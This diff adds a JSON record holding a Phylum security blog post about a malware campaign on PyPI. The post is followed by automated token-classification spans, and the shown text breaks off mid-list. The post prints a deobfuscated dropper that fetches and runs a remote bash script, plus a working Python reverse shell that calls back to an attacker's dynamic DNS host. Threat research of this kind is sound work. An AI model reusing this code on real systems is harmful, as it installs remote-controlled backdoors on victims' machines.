@@ -1,0 +1,4345 @@
+{
+  "text": "\nSoftware supply chain attacks in the open-source ecosystem are frequent and pervasive. The cost of publishing a malicious package is low, while the payoff could be high - yielding keys to infrastructure, bank credentials, or cryptocurrency.\nPhylum ingests all packages as they are published into these open-source ecosystems and analyzes the source files (over half a billion source files this year) to determine if they exhibit any indications of maliciousness.\nPerforming analysis at this scale allows us to make determinations about the behaviors of software supply chain threat actors over time. As these threat actors must work in public (given how open source works), it allows us to gain insight into their evolving tactics.\nThis is an overview of how we tracked an attacker (internally dubbed Gooberworm), monitored their development in real-time, and disrupted their campaign.\nA burgeoning threat\nOn November 15, 2022, Phylum's system began notifying us of malicious packages being published to PyPI. Our automation capability immediately protected our users from this threat, and we published our findings to Twitter:\nAs the day went on, the list of published packages continued to grow:\n\ncolurama -> colurama ⚠️ Check Package\ncoloroma -> Coloroma ⚠️ Check Package\ncolorarise  -> colorarise ⚠️ Check Package\nrandomized -> randomized ⚠️ Check Package\nmsfpath ->msfpath ⚠️ Check Package\nBuried in each of these, as one might expect, was a bunch of obfuscated Python:\nMany layers of obfuscation\nThe obfuscation here is comically bad (I’m sensing a pattern here). Replacing the exec with a print statement unwraps the first layer of obfuscation.\nHere is yet another layer of a different sort of obfuscation. However, unrolling it is exactly the same. Replace the exec with a print and move on.\nIn the third layer, the actor tried to be a bit trickier and compile the resulting source into Python bytecode. Replacing the last line with a print(oIoeaTEAcvpae) gets us the underlying source.\nimport platform\nimport subprocess\nif platform.system().startswith(\"Linux\"):\n        try:\n            with open('/tmp/file.py', 'w') as f:\n                f.write(\"import os \\nimport subprocess \\nfrom pathlib import Path \\nfrom urllib import request \\n\")\n                f.write(\"hello = os.getlogin() \\n\")\n                f.write(\"PATH = '/home/' + hello + '/.msfdb.d'\\n\")\n                f.write(\"PAT  = '/tmp/file.py'\\n\")\n                f.write(\"isExist = os.path.exists(PATH) \\n\")\n                f.write(\"if not isExist:\\n\")\n                f.write(\"        os.makedirs(PATH) \\n\")\n                f.write(\"if Path(PATH).is_file(): \\n\")\n                f.write(\"           print(\"\") \\n\")\n                f.write(\"else: \\n\")\n                f.write(\"     remote_url = 'https://raw.githubusercontent.com/gobiwound/ab32/main/naopcEaovaeAvocpa.sh' \\n\")\n                f.write(\"     local_file = PATH+'/msfdb.sh' \\n\")\n                f.write(\"     request.urlretrieve(remote_url, local_file) \\n\")\n                f.write(\"     subprocess.call(\\\"bash /home/$USER/.msfdb.d/msfdb.sh\\\", shell=True) \\n\")\n                f.write(\"     if Path(PAT).is_file(): \\n\")\n                f.write(\"         try:\\n           os.remove(PAT)\\n\")\n                f.write(\"         except:\\n           print()\")\n\n        except FileNotFoundError:\n            print(\"\")\n        subprocess.call(\"python3 /tmp/file.py &\", shell=True)\n\nelse:\n    print(\"\")\nThe actor then fetches something from GitHub, saves it locally as msfdb.sh, and executes it. That, too, is heavily obfuscated, which makes it somewhat difficult to reason about. Helpfully though, the actor was kind enough to store everything in a Git repo that Phylum could access. At the time of publishing, the GitHub repo is still accessible at https://github.com/gobiwound/ab32.\nWatching the attacker work in real-time\nIt was around this time that we decided to report the repo to GitHub in hopes that we would cut down another component of this actor’s attack infrastructure.\nWe also witnessed the attacker updating the obfuscation for their payload in real time, continuing to hone their attack for maximum efficacy.\nBy this time, Phylum had already ruined the campaign, but the attacker likely didn’t realize just how burned they were. It was time to let them know. For posterity, we cloned the existing Git repo and created a new issue in the attacker’s GitHub repository.\nThe attacker panics\nThe attacker continued his work for the next few hours, blissfully unaware of our newly minted issue.\nWhen the actor did finally notice, they did what we can only assume was the first thing that came to mind: push a commit deleting all of the files from the repo. Unfortunately for them, they appear to be completely unaware of the fact that pushing a commit removing files doesn’t also remove those files from the Git history.\nIn an attempt to further hide their tracks, the actor also tried to clean up the issue we created. Phylum was one step ahead and ensured that an issue title change occurred, which prevented the attacker from completely removing all references to malware.\nWe can only assume “k” is the actor's response to us after we told them to “knock off” publishing malware on PyPI. Though we don’t expect that our attacker friend has any intentions of doing so.\nUnrolling the remaining obfuscation\nThe question remains, though: what does the obfuscated bash script naopcEaovaeAvocpa.sh in the Git repo do? Fortunately for us, the attacker committed the full history for this file, allowing us to get a good sense of the underlying functionality.\nThe attacker has contributed a few commits updating the obfuscation methods for this file. If we go back to the earliest commit touching this file, we find a file rename: from xsession-error.sh to naopcEaovaeAvocpa.sh.\nSurely the attacker wasn’t dumb enough to commit the original file completely unobfuscated… right? Spoiler alert: they were.\nAt a high level, the bash checks to see if msfpath exists on the system. If it doesn’t, the package is pip installed. It then attempts to import check from msfpath and execute it.\nmsfpath contains additional obfuscation, but using the tried and true replace eval with print, we were able to get back to the original Python for check.py quickly.\nimport socket\nimport json\nimport subprocess\nimport time\nimport os\ndef reliable_send(data):\n    jsondata = json.dumps(data)\n    s.send(jsondata.encode())\ndef reliable_recv():\n    data = ''\n    while True:\n        try:\n            data = data + s.recv(1024).decode().rstrip()\n            return json.loads(data)\n        except ValueError:\n            continue\ndef download_file(file_name):\n    f = open(file_name, 'wb')\n    s.settimeout(1)\n    chunk = s.recv(1024)\n    while chunk:\n        f.write(chunk)\n        try:\n            chunk = s.recv(1024)\n        except socket.timeout as e:\n            break\n    s.settimeout(None)\n    f.close()\ndef upload_file(file_name):\n    f = open(file_name, 'rb')\n    s.send(f.read())\ndef connection():\n    while True:\n        time.sleep(4)\n        try:\n            s.connect(('hellwound.bounceme.net', 6003))\n            shell()\n            s.close()\n            break\n        except:\n            connection()\ndef shell():\n    while True:\n        command = reliable_recv()\n        if command == 'quit':\n            break\n        elif command == 'background':\n            pass\n        elif command == 'help':\n            pass\n        elif command == 'clear':\n            pass\n        elif command[:3] == 'cd ':\n            os.chdir(command[3:])\n        if command[:3] == 'res ':\n            reliable_send(True)\n            break\n        elif command[:6] == 'upload':\n            download_file(command[7:])\n        elif command[:8] == 'download':\n            upload_file(command[9:])\n        elif command[:7] == 'sendall':\n            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)\n        else:\n            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n            result = execute.stdout.read() + execute.stderr.read()\n            result = result.decode()\n            reliable_send(result)\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ndef catc():\n    try:\n      connection()\n    except KeyboardInterrupt:\n      quit()\ncatc()\nThe script makes a connection to hellwound.bounceme.net (a no-IP DDNS hostname). It receives data from this server and, depending on the command received, takes action on the infected machine.\nThe attacker’s intentions are now clear: infect as many machines as possible by way of infected Python packages, and build an army of attacker-controlled bots.\nAnd what about cronjob.out that appears in the Git repo? What’s the purpose of this file in this whole scheme? We’ll be publishing a follow-up post outlining how one of our engineers busted out Ghidra to make sense of this file.\nThis is not the end\nAt this point, the attacker's malicious packages have been removed. We reported their GitHub repository, reported their host to no-IP and publicly shamed them. Software supply chain attack thwarted!\n\nWhile we successfully disrupted this campaign, rest assured this is not the last time we’ll see this threat actor. They’ll be back with updated TTPs, targeting software engineers with innocuous packages that subtly insert malware onto developer machines. The attackers are numerous and persistent; a true software Hydra - cut off the head of one attacker and two more attackers take their place.\nThus, we as engineers, must remain vigilant - checking each piece of software that we pull into our builds in an automated fashion, to block threats at the source. \n\nWith this in mind, we’ll leave all the attackers - who I’m sure are reading this - with the following:",
+  "entities": [
+    {
+      "entity": "software supply chain attacks in the open -",
+      "type": "LABEL_1",
+      "score": 0.5886995792388916,
+      "start": 1,
+      "end": 43
+    },
+    {
+      "entity": "source",
+      "type": "LABEL_0",
+      "score": 0.5082916617393494,
+      "start": 43,
+      "end": 49
+    },
+    {
+      "entity": "ecosystem",
+      "type": "LABEL_1",
+      "score": 0.6567362546920776,
+      "start": 50,
+      "end": 59
+    },
+    {
+      "entity": "are frequent and",
+      "type": "LABEL_0",
+      "score": 0.6092364192008972,
+      "start": 60,
+      "end": 76
+    },
+    {
+      "entity": "pervasive. the cost of publishing a malicious package",
+      "type": "LABEL_1",
+      "score": 0.669466495513916,
+      "start": 77,
+      "end": 130
+    },
+    {
+      "entity": "is low",
+      "type": "LABEL_0",
+      "score": 0.5990824103355408,
+      "start": 131,
+      "end": 137
+    },
+    {
+      "entity": ", while the payoff could be",
+      "type": "LABEL_1",
+      "score": 0.6348915100097656,
+      "start": 137,
+      "end": 164
+    },
+    {
+      "entity": "high - yielding",
+      "type": "LABEL_0",
+      "score": 0.6285658478736877,
+      "start": 165,
+      "end": 180
+    },
+    {
+      "entity": "keys to",
+      "type": "LABEL_1",
+      "score": 0.6469881534576416,
+      "start": 181,
+      "end": 188
+    },
+    {
+      "entity": "infrastructure",
+      "type": "LABEL_0",
+      "score": 0.6861791610717773,
+      "start": 189,
+      "end": 203
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7964587211608887,
+      "start": 203,
+      "end": 204
+    },
+    {
+      "entity": "bank credentials",
+      "type": "LABEL_0",
+      "score": 0.6217895746231079,
+      "start": 205,
+      "end": 221
+    },
+    {
+      "entity": ", or cryptocurrency.",
+      "type": "LABEL_1",
+      "score": 0.6580437421798706,
+      "start": 221,
+      "end": 241
+    },
+    {
+      "entity": "phyl",
+      "type": "LABEL_0",
+      "score": 0.524003267288208,
+      "start": 242,
+      "end": 246
+    },
+    {
+      "entity": "##um",
+      "type": "LABEL_1",
+      "score": 0.5167811512947083,
+      "start": 246,
+      "end": 248
+    },
+    {
+      "entity": "ingests all packages",
+      "type": "LABEL_0",
+      "score": 0.6653286814689636,
+      "start": 249,
+      "end": 269
+    },
+    {
+      "entity": "as they",
+      "type": "LABEL_1",
+      "score": 0.6093777418136597,
+      "start": 270,
+      "end": 277
+    },
+    {
+      "entity": "are published",
+      "type": "LABEL_0",
+      "score": 0.584581732749939,
+      "start": 278,
+      "end": 291
+    },
+    {
+      "entity": "into these open",
+      "type": "LABEL_1",
+      "score": 0.5565682053565979,
+      "start": 292,
+      "end": 307
+    },
+    {
+      "entity": "- source",
+      "type": "LABEL_0",
+      "score": 0.5982707738876343,
+      "start": 307,
+      "end": 314
+    },
+    {
+      "entity": "ecosystems and analyzes",
+      "type": "LABEL_1",
+      "score": 0.5633282661437988,
+      "start": 315,
+      "end": 338
+    },
+    {
+      "entity": "the source files ( over half a billion source",
+      "type": "LABEL_0",
+      "score": 0.640486478805542,
+      "start": 339,
+      "end": 383
+    },
+    {
+      "entity": "files this",
+      "type": "LABEL_1",
+      "score": 0.6544214487075806,
+      "start": 384,
+      "end": 394
+    },
+    {
+      "entity": "year )",
+      "type": "LABEL_0",
+      "score": 0.5515738725662231,
+      "start": 395,
+      "end": 400
+    },
+    {
+      "entity": "to determine",
+      "type": "LABEL_1",
+      "score": 0.579498291015625,
+      "start": 401,
+      "end": 413
+    },
+    {
+      "entity": "if they exhibit any indications of",
+      "type": "LABEL_0",
+      "score": 0.6329340934753418,
+      "start": 414,
+      "end": 448
+    },
+    {
+      "entity": "maliciousness. performing analysis at this scale allows us to",
+      "type": "LABEL_1",
+      "score": 0.643516480922699,
+      "start": 449,
+      "end": 510
+    },
+    {
+      "entity": "make determinations about the behaviors of software supply",
+      "type": "LABEL_0",
+      "score": 0.6289371848106384,
+      "start": 511,
+      "end": 569
+    },
+    {
+      "entity": "chain threat",
+      "type": "LABEL_1",
+      "score": 0.7486196756362915,
+      "start": 570,
+      "end": 582
+    },
+    {
+      "entity": "actors over",
+      "type": "LABEL_0",
+      "score": 0.5492607355117798,
+      "start": 583,
+      "end": 594
+    },
+    {
+      "entity": "time. as these threat",
+      "type": "LABEL_1",
+      "score": 0.6596697568893433,
+      "start": 595,
+      "end": 616
+    },
+    {
+      "entity": "actors must work in public ( given how open source works )",
+      "type": "LABEL_0",
+      "score": 0.6354543566703796,
+      "start": 617,
+      "end": 673
+    },
+    {
+      "entity": ", it",
+      "type": "LABEL_1",
+      "score": 0.6554311513900757,
+      "start": 673,
+      "end": 677
+    },
+    {
+      "entity": "allows us",
+      "type": "LABEL_0",
+      "score": 0.5860704183578491,
+      "start": 678,
+      "end": 687
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5843375325202942,
+      "start": 688,
+      "end": 690
+    },
+    {
+      "entity": "gain",
+      "type": "LABEL_0",
+      "score": 0.527818500995636,
+      "start": 691,
+      "end": 695
+    },
+    {
+      "entity": "insight",
+      "type": "LABEL_1",
+      "score": 0.5867053270339966,
+      "start": 696,
+      "end": 703
+    },
+    {
+      "entity": "into",
+      "type": "LABEL_0",
+      "score": 0.7028170228004456,
+      "start": 704,
+      "end": 708
+    },
+    {
+      "entity": "their",
+      "type": "LABEL_1",
+      "score": 0.6514301300048828,
+      "start": 709,
+      "end": 714
+    },
+    {
+      "entity": "evolving tactics",
+      "type": "LABEL_0",
+      "score": 0.5887477397918701,
+      "start": 715,
+      "end": 731
+    },
+    {
+      "entity": ". this",
+      "type": "LABEL_1",
+      "score": 0.7962709665298462,
+      "start": 731,
+      "end": 737
+    },
+    {
+      "entity": "is an overview",
+      "type": "LABEL_0",
+      "score": 0.5735111832618713,
+      "start": 738,
+      "end": 752
+    },
+    {
+      "entity": "of how we tracked",
+      "type": "LABEL_1",
+      "score": 0.6622474789619446,
+      "start": 753,
+      "end": 770
+    },
+    {
+      "entity": "an attacker ( internally",
+      "type": "LABEL_0",
+      "score": 0.5624737739562988,
+      "start": 771,
+      "end": 794
+    },
+    {
+      "entity": "dubbed",
+      "type": "LABEL_1",
+      "score": 0.7787895202636719,
+      "start": 795,
+      "end": 801
+    },
+    {
+      "entity": "goo",
+      "type": "LABEL_0",
+      "score": 0.5572433471679688,
+      "start": 802,
+      "end": 805
+    },
+    {
+      "entity": "##ber",
+      "type": "LABEL_1",
+      "score": 0.5767561793327332,
+      "start": 805,
+      "end": 808
+    },
+    {
+      "entity": "##worm )",
+      "type": "LABEL_0",
+      "score": 0.6161552667617798,
+      "start": 808,
+      "end": 813
+    },
+    {
+      "entity": ", monitored their",
+      "type": "LABEL_1",
+      "score": 0.6506755948066711,
+      "start": 813,
+      "end": 830
+    },
+    {
+      "entity": "development",
+      "type": "LABEL_0",
+      "score": 0.6062453389167786,
+      "start": 831,
+      "end": 842
+    },
+    {
+      "entity": "in real",
+      "type": "LABEL_1",
+      "score": 0.5901785492897034,
+      "start": 843,
+      "end": 850
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.7195531725883484,
+      "start": 850,
+      "end": 851
+    },
+    {
+      "entity": "time, and",
+      "type": "LABEL_1",
+      "score": 0.6893637180328369,
+      "start": 851,
+      "end": 860
+    },
+    {
+      "entity": "disrupted",
+      "type": "LABEL_0",
+      "score": 0.5389851927757263,
+      "start": 861,
+      "end": 870
+    },
+    {
+      "entity": "their",
+      "type": "LABEL_1",
+      "score": 0.6692909002304077,
+      "start": 871,
+      "end": 876
+    },
+    {
+      "entity": "campaign",
+      "type": "LABEL_0",
+      "score": 0.6916218400001526,
+      "start": 877,
+      "end": 885
+    },
+    {
+      "entity": ". a",
+      "type": "LABEL_1",
+      "score": 0.5669054985046387,
+      "start": 885,
+      "end": 888
+    },
+    {
+      "entity": "burgeoning",
+      "type": "LABEL_0",
+      "score": 0.6987407207489014,
+      "start": 889,
+      "end": 899
+    },
+    {
+      "entity": "threat",
+      "type": "LABEL_1",
+      "score": 0.6994292140007019,
+      "start": 900,
+      "end": 906
+    },
+    {
+      "entity": "on november 15",
+      "type": "LABEL_0",
+      "score": 0.7043735384941101,
+      "start": 907,
+      "end": 921
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7892438173294067,
+      "start": 921,
+      "end": 922
+    },
+    {
+      "entity": "2022",
+      "type": "LABEL_0",
+      "score": 0.5715631246566772,
+      "start": 923,
+      "end": 927
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7717397809028625,
+      "start": 927,
+      "end": 928
+    },
+    {
+      "entity": "phylum",
+      "type": "LABEL_0",
+      "score": 0.5932051539421082,
+      "start": 929,
+      "end": 935
+    },
+    {
+      "entity": "'",
+      "type": "LABEL_1",
+      "score": 0.5621084570884705,
+      "start": 935,
+      "end": 936
+    },
+    {
+      "entity": "s system began notifying us",
+      "type": "LABEL_0",
+      "score": 0.6614857912063599,
+      "start": 936,
+      "end": 963
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.6226775646209717,
+      "start": 964,
+      "end": 966
+    },
+    {
+      "entity": "malicious packages being",
+      "type": "LABEL_0",
+      "score": 0.6155313849449158,
+      "start": 967,
+      "end": 991
+    },
+    {
+      "entity": "published to",
+      "type": "LABEL_1",
+      "score": 0.6415163278579712,
+      "start": 992,
+      "end": 1004
+    },
+    {
+      "entity": "pyp",
+      "type": "LABEL_0",
+      "score": 0.5025840401649475,
+      "start": 1005,
+      "end": 1008
+    },
+    {
+      "entity": "##i.",
+      "type": "LABEL_1",
+      "score": 0.6455552577972412,
+      "start": 1008,
+      "end": 1010
+    },
+    {
+      "entity": "our",
+      "type": "LABEL_1",
+      "score": 0.8245048522949219,
+      "start": 1011,
+      "end": 1014
+    },
+    {
+      "entity": "automation",
+      "type": "LABEL_0",
+      "score": 0.5667247176170349,
+      "start": 1015,
+      "end": 1025
+    },
+    {
+      "entity": "capability immediately protected our",
+      "type": "LABEL_1",
+      "score": 0.709361732006073,
+      "start": 1026,
+      "end": 1062
+    },
+    {
+      "entity": "users from",
+      "type": "LABEL_0",
+      "score": 0.5766096115112305,
+      "start": 1063,
+      "end": 1073
+    },
+    {
+      "entity": "this threat, and we published our findings to twitter : as the day went on, the list of published packages continued to grow : colura",
+      "type": "LABEL_1",
+      "score": 0.6898143887519836,
+      "start": 1074,
+      "end": 1206
+    },
+    {
+      "entity": "##ma",
+      "type": "LABEL_0",
+      "score": 0.5138393044471741,
+      "start": 1206,
+      "end": 1208
+    },
+    {
+      "entity": "- > colurama ⚠ check package coloroma - > coloroma ⚠ check package colorarise - > colorarise ⚠",
+      "type": "LABEL_1",
+      "score": 0.6608069539070129,
+      "start": 1209,
+      "end": 1303
+    },
+    {
+      "entity": "check",
+      "type": "LABEL_0",
+      "score": 0.5744360685348511,
+      "start": 1305,
+      "end": 1310
+    },
+    {
+      "entity": "package randomized - > randomized ⚠ check package msfpath - > msfpath ⚠ check package buried in each",
+      "type": "LABEL_1",
+      "score": 0.6468706727027893,
+      "start": 1311,
+      "end": 1410
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_0",
+      "score": 0.5262676477432251,
+      "start": 1411,
+      "end": 1413
+    },
+    {
+      "entity": "these, as one",
+      "type": "LABEL_1",
+      "score": 0.6871523857116699,
+      "start": 1414,
+      "end": 1427
+    },
+    {
+      "entity": "might expect",
+      "type": "LABEL_0",
+      "score": 0.5670770406723022,
+      "start": 1428,
+      "end": 1440
+    },
+    {
+      "entity": ", was",
+      "type": "LABEL_1",
+      "score": 0.7599496841430664,
+      "start": 1440,
+      "end": 1445
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_0",
+      "score": 0.6284366250038147,
+      "start": 1446,
+      "end": 1447
+    },
+    {
+      "entity": "bunch",
+      "type": "LABEL_1",
+      "score": 0.5278033018112183,
+      "start": 1448,
+      "end": 1453
+    },
+    {
+      "entity": "of obfuscated",
+      "type": "LABEL_0",
+      "score": 0.5704195499420166,
+      "start": 1454,
+      "end": 1467
+    },
+    {
+      "entity": "python :",
+      "type": "LABEL_1",
+      "score": 0.5254324078559875,
+      "start": 1468,
+      "end": 1475
+    },
+    {
+      "entity": "many",
+      "type": "LABEL_0",
+      "score": 0.8084093928337097,
+      "start": 1476,
+      "end": 1480
+    },
+    {
+      "entity": "layers of",
+      "type": "LABEL_1",
+      "score": 0.5829466581344604,
+      "start": 1481,
+      "end": 1490
+    },
+    {
+      "entity": "obfuscation",
+      "type": "LABEL_0",
+      "score": 0.5891676545143127,
+      "start": 1491,
+      "end": 1502
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_1",
+      "score": 0.6487902998924255,
+      "start": 1503,
+      "end": 1506
+    },
+    {
+      "entity": "obfuscation",
+      "type": "LABEL_0",
+      "score": 0.5204403400421143,
+      "start": 1507,
+      "end": 1518
+    },
+    {
+      "entity": "here",
+      "type": "LABEL_1",
+      "score": 0.6680566668510437,
+      "start": 1519,
+      "end": 1523
+    },
+    {
+      "entity": "is",
+      "type": "LABEL_0",
+      "score": 0.6147464513778687,
+      "start": 1524,
+      "end": 1526
+    },
+    {
+      "entity": "comically bad ( i ’",
+      "type": "LABEL_1",
+      "score": 0.6270176768302917,
+      "start": 1527,
+      "end": 1544
+    },
+    {
+      "entity": "m sensing a",
+      "type": "LABEL_0",
+      "score": 0.680188000202179,
+      "start": 1544,
+      "end": 1555
+    },
+    {
+      "entity": "pattern here",
+      "type": "LABEL_1",
+      "score": 0.576143205165863,
+      "start": 1556,
+      "end": 1568
+    },
+    {
+      "entity": ")",
+      "type": "LABEL_0",
+      "score": 0.5630795955657959,
+      "start": 1568,
+      "end": 1569
+    },
+    {
+      "entity": ". replacing the exec with a print statement unwraps",
+      "type": "LABEL_1",
+      "score": 0.640090823173523,
+      "start": 1569,
+      "end": 1620
+    },
+    {
+      "entity": "the first",
+      "type": "LABEL_0",
+      "score": 0.6108174324035645,
+      "start": 1621,
+      "end": 1630
+    },
+    {
+      "entity": "layer of",
+      "type": "LABEL_1",
+      "score": 0.6237756609916687,
+      "start": 1631,
+      "end": 1639
+    },
+    {
+      "entity": "obfuscation",
+      "type": "LABEL_0",
+      "score": 0.5288883447647095,
+      "start": 1640,
+      "end": 1651
+    },
+    {
+      "entity": ". here is yet another layer of a",
+      "type": "LABEL_1",
+      "score": 0.6737086772918701,
+      "start": 1651,
+      "end": 1683
+    },
+    {
+      "entity": "different",
+      "type": "LABEL_0",
+      "score": 0.6662420034408569,
+      "start": 1684,
+      "end": 1693
+    },
+    {
+      "entity": "sort of",
+      "type": "LABEL_1",
+      "score": 0.6965174674987793,
+      "start": 1694,
+      "end": 1701
+    },
+    {
+      "entity": "obfuscation",
+      "type": "LABEL_0",
+      "score": 0.5306945443153381,
+      "start": 1702,
+      "end": 1713
+    },
+    {
+      "entity": ". however, unrolling it is",
+      "type": "LABEL_1",
+      "score": 0.6868422031402588,
+      "start": 1713,
+      "end": 1739
+    },
+    {
+      "entity": "exactly",
+      "type": "LABEL_0",
+      "score": 0.5765568017959595,
+      "start": 1740,
+      "end": 1747
+    },
+    {
+      "entity": "the same.",
+      "type": "LABEL_1",
+      "score": 0.6608244776725769,
+      "start": 1748,
+      "end": 1757
+    },
+    {
+      "entity": "replace",
+      "type": "LABEL_0",
+      "score": 0.5583281517028809,
+      "start": 1758,
+      "end": 1765
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_1",
+      "score": 0.5388022661209106,
+      "start": 1766,
+      "end": 1769
+    },
+    {
+      "entity": "exec",
+      "type": "LABEL_0",
+      "score": 0.5520489811897278,
+      "start": 1770,
+      "end": 1774
+    },
+    {
+      "entity": "with a print and",
+      "type": "LABEL_1",
+      "score": 0.624638020992279,
+      "start": 1775,
+      "end": 1791
+    },
+    {
+      "entity": "move",
+      "type": "LABEL_0",
+      "score": 0.6247917413711548,
+      "start": 1792,
+      "end": 1796
+    },
+    {
+      "entity": "on. in the",
+      "type": "LABEL_1",
+      "score": 0.6428701877593994,
+      "start": 1797,
+      "end": 1807
+    },
+    {
+      "entity": "third",
+      "type": "LABEL_0",
+      "score": 0.6913396716117859,
+      "start": 1808,
+      "end": 1813
+    },
+    {
+      "entity": "layer, the actor tried to be a",
+      "type": "LABEL_1",
+      "score": 0.6716012954711914,
+      "start": 1814,
+      "end": 1844
+    },
+    {
+      "entity": "bit",
+      "type": "LABEL_0",
+      "score": 0.5543373227119446,
+      "start": 1845,
+      "end": 1848
+    },
+    {
+      "entity": "trickier and compile the resulting",
+      "type": "LABEL_1",
+      "score": 0.6564229726791382,
+      "start": 1849,
+      "end": 1883
+    },
+    {
+      "entity": "source into",
+      "type": "LABEL_0",
+      "score": 0.5746102333068848,
+      "start": 1884,
+      "end": 1895
+    },
+    {
+      "entity": "python bytecode. replacing the",
+      "type": "LABEL_1",
+      "score": 0.6950405836105347,
+      "start": 1896,
+      "end": 1926
+    },
+    {
+      "entity": "last",
+      "type": "LABEL_0",
+      "score": 0.5040727257728577,
+      "start": 1927,
+      "end": 1931
+    },
+    {
+      "entity": "line with a print ( oioeateacvpae",
+      "type": "LABEL_1",
+      "score": 0.6271705627441406,
+      "start": 1932,
+      "end": 1963
+    },
+    {
+      "entity": ") gets",
+      "type": "LABEL_0",
+      "score": 0.573417067527771,
+      "start": 1963,
+      "end": 1969
+    },
+    {
+      "entity": "us the underlying",
+      "type": "LABEL_1",
+      "score": 0.6433534622192383,
+      "start": 1970,
+      "end": 1987
+    },
+    {
+      "entity": "source",
+      "type": "LABEL_0",
+      "score": 0.5902096033096313,
+      "start": 1988,
+      "end": 1994
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8368709683418274,
+      "start": 1994,
+      "end": 1995
+    },
+    {
+      "entity": "import platform import",
+      "type": "LABEL_1",
+      "score": 0.6670110821723938,
+      "start": 1996,
+      "end": 2018
+    },
+    {
+      "entity": "subprocess if",
+      "type": "LABEL_0",
+      "score": 0.5815154314041138,
+      "start": 2019,
+      "end": 2032
+    },
+    {
+      "entity": "platform. system ( ). startswith (",
+      "type": "LABEL_1",
+      "score": 0.6457123756408691,
+      "start": 2033,
+      "end": 2062
+    },
+    {
+      "entity": "\"",
+      "type": "LABEL_0",
+      "score": 0.506452739238739,
+      "start": 2062,
+      "end": 2063
+    },
+    {
+      "entity": "linux \" ) : try : with open ( '",
+      "type": "LABEL_1",
+      "score": 0.6256763339042664,
+      "start": 2063,
+      "end": 2108
+    },
+    {
+      "entity": "/",
+      "type": "LABEL_0",
+      "score": 0.5365030765533447,
+      "start": 2108,
+      "end": 2109
+    },
+    {
+      "entity": "tmp /",
+      "type": "LABEL_1",
+      "score": 0.5943098068237305,
+      "start": 2109,
+      "end": 2113
+    },
+    {
+      "entity": "file",
+      "type": "LABEL_0",
+      "score": 0.5405910015106201,
+      "start": 2113,
+      "end": 2117
+    },
+    {
+      "entity": ". py ', ' w ' )",
+      "type": "LABEL_1",
+      "score": 0.6670008897781372,
+      "start": 2117,
+      "end": 2127
+    },
+    {
+      "entity": "as f :",
+      "type": "LABEL_0",
+      "score": 0.5321779847145081,
+      "start": 2128,
+      "end": 2133
+    },
+    {
+      "entity": "f. write",
+      "type": "LABEL_1",
+      "score": 0.5883429646492004,
+      "start": 2150,
+      "end": 2157
+    },
+    {
+      "entity": "(",
+      "type": "LABEL_0",
+      "score": 0.5386014580726624,
+      "start": 2157,
+      "end": 2158
+    },
+    {
+      "entity": "\" import os \\ nimport",
+      "type": "LABEL_1",
+      "score": 0.6951892971992493,
+      "start": 2158,
+      "end": 2177
+    },
+    {
+      "entity": "subprocess",
+      "type": "LABEL_0",
+      "score": 0.6830764412879944,
+      "start": 2178,
+      "end": 2188
+    },
+    {
+      "entity": "\\ nfrom pathlib import path \\ nfrom urllib import request \\ n \" )",
+      "type": "LABEL_1",
+      "score": 0.6982607245445251,
+      "start": 2189,
+      "end": 2249
+    },
+    {
+      "entity": "f",
+      "type": "LABEL_0",
+      "score": 0.5826060175895691,
+      "start": 2266,
+      "end": 2267
+    },
+    {
+      "entity": ". write ( \" hello =",
+      "type": "LABEL_1",
+      "score": 0.5780244469642639,
+      "start": 2267,
+      "end": 2282
+    },
+    {
+      "entity": "os",
+      "type": "LABEL_0",
+      "score": 0.6174078583717346,
+      "start": 2283,
+      "end": 2285
+    },
+    {
+      "entity": ". getlogin ( ) \\ n \" ) f. write (",
+      "type": "LABEL_1",
+      "score": 0.6284672021865845,
+      "start": 2285,
+      "end": 2326
+    },
+    {
+      "entity": "\"",
+      "type": "LABEL_0",
+      "score": 0.5704305768013,
+      "start": 2326,
+      "end": 2327
+    },
+    {
+      "entity": "path = ' / home / '",
+      "type": "LABEL_1",
+      "score": 0.7306855320930481,
+      "start": 2327,
+      "end": 2342
+    },
+    {
+      "entity": "+ hello",
+      "type": "LABEL_0",
+      "score": 0.5249379277229309,
+      "start": 2343,
+      "end": 2350
+    },
+    {
+      "entity": "+ '",
+      "type": "LABEL_1",
+      "score": 0.6342141032218933,
+      "start": 2351,
+      "end": 2354
+    },
+    {
+      "entity": "/",
+      "type": "LABEL_0",
+      "score": 0.5494571924209595,
+      "start": 2354,
+      "end": 2355
+    },
+    {
+      "entity": ". msf",
+      "type": "LABEL_1",
+      "score": 0.6357221603393555,
+      "start": 2355,
+      "end": 2359
+    },
+    {
+      "entity": "##db",
+      "type": "LABEL_0",
+      "score": 0.585594892501831,
+      "start": 2359,
+      "end": 2361
+    },
+    {
+      "entity": ". d ' \\ n \" )",
+      "type": "LABEL_1",
+      "score": 0.7142292857170105,
+      "start": 2361,
+      "end": 2368
+    },
+    {
+      "entity": "f",
+      "type": "LABEL_0",
+      "score": 0.5359111428260803,
+      "start": 2385,
+      "end": 2386
+    },
+    {
+      "entity": ". write",
+      "type": "LABEL_1",
+      "score": 0.5909927487373352,
+      "start": 2386,
+      "end": 2392
+    },
+    {
+      "entity": "( \" pat",
+      "type": "LABEL_0",
+      "score": 0.5330262780189514,
+      "start": 2392,
+      "end": 2397
+    },
+    {
+      "entity": "= '",
+      "type": "LABEL_1",
+      "score": 0.7059745788574219,
+      "start": 2399,
+      "end": 2402
+    },
+    {
+      "entity": "/",
+      "type": "LABEL_0",
+      "score": 0.6259403228759766,
+      "start": 2402,
+      "end": 2403
+    },
+    {
